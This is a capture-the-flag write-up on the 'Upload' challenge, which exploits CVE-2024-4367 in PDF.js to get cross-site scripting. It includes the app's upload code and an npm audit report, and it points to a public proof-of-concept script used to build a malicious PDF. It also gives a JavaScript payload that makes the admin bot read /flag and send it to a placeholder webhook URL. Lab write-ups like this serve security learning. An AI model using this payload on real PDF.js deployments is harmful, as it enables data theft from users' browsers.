# Upload

## Exploring the Intricacies of CVE-2024-4367 in PDF.js Library for XSS Exploits

### Authored by: @S0nG0ku

### Title: Exploiting CVE-2024-4367 in PDF.js Library for XSS Vulnerabilities

#### Introduction:
CVE-2024-4367 presents a critical vulnerability within the esteemed PDF.js library, widely embraced for its adeptness in rendering PDF files in web browsers. This particular exploit enables adversaries to inject and execute arbitrary JavaScript code within a user's browser context, catalyzing a perilous Cross-Site Scripting (XSS) scenario.

#### In-Depth Analysis:

- Delving into the Application's PDF File Upload Mechanism:

```javascript
const upload = multer({ 
  storage: storage,
  fileFilter: (req, file, cb) => {
    if (file.mimetype == "application/pdf") {
      cb(null, true);
    } else {
      cb(null, false);
      return cb(new Error('Only .pdf format allowed!'));
    }
  }
  .....
  app.get('/upload', (req, res) => {
	let error = req.session.error;
	if (error) {
	  req.flash('error', 'Your error message');
	  return res.redirect('/upload');
	}	
	if (req.session.user) {
	  res.render('upload');
	} else {
	  res.redirect('/login');
	}
});

app.post('/upload', upload.single('file'), (req, res) => {
	const fileData = {
	  filename: req.file.filename,
	  path: req.file.path,
	  user: req.user
	};
  
	uploadfile.insert(fileData, (err, newDoc) => {
	  if (err) {
		res.status(500).send(err);
	  } else {
		res.redirect('/view/' + req.file.filename);
	  }
	});
});
});
```

- A Crucial Vulnerability in PDF.js Version Discovered via npm Audit:

```
# npm audit report

nedb  *
Severity: critical
Prototype Pollution in nedb - https://github.com/advisories/GHSA-339j-hqgx-qrrx
Depends on vulnerable versions of binary-search-tree
Depends on vulnerable versions of underscore
No fix available
node_modules/nedb

pdfjs-dist  <=4.1.392
Severity: high
PDF.js vulnerable to arbitrary JavaScript execution upon opening a malicious PDF - https://github.com/advisories/GHSA-wgrm-67xf-hhpq
fix available via `npm audit fix --force`
Will install pdfjs-dist@4.3.136, which is a breaking change
node_modules/pdfjs-dist
```

- Stay Informed with Recent Articles Addressing this Vulnerability.

- Obtain the Repository for Further Examination: https://github.com/LOURC0D3/CVE-2024-4367-PoC.

- JS Execution
```
python3 CVE-2024-4367.py "alert(document.domain)"
```

- Proceed to Acquire the Flag Located at localhost/flag, Currently Inaccessible.

```
app.get('/flag', (req, res) => {
  let ip = req.connection.remoteAddress;
  if (ip === '127.0.0.1') {
    res.json({ flag: 'AKASEC{PDF_1s_4w3s0m3_W1th_XSS_&&_Fr33_P4le5T1n3}' });
  } else {
    res.status(403).json({ error: 'Access denied' });
  }
});
```

- Utilize bot.js's Ability to Access Localhost to Exploit XSS and Retrieve /flag:

```
fetch("/flag")
  .then(response => response.json())
  .then(data => {
    const flag = encodeURIComponent(JSON.stringify(data));
    return fetch(`<WEBHOOK_URL_HERE>?flag=${flag}`);
  })
```

```
python3 CVE-2024-4367.py 'fetch("/flag")
  .then(response => response.json())
  .then(data => {
    const flag = encodeURIComponent(JSON.stringify(data));
    return fetch(`<WEBHOOK_URL_HERE>?flag=${flag}`);
  })'
[+] Created malicious PDF file: poc.pdf
[+] Open the file with the vulnerable application to trigger the exploit.
```
- Upon Successful Upload and Transmission to the Bot, the Flag is Attained.

#### Conclusion:
CVE-2024-4367 underscores the criticality of maintaining up-to-date software libraries and adhering to secure coding practices to mitigate the risk of XSS attacks and other security vulnerabilities in web applications that rely on third-party libraries like PDF.js. For further insights into the technical details and exploitation techniques related to this vulnerability, readers are encouraged to visit the comprehensive analysis available at codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/. By comprehensively understanding this vulnerability and its potential implications, developers and security professionals can enhance their defenses and safeguard their applications and users against exploitation.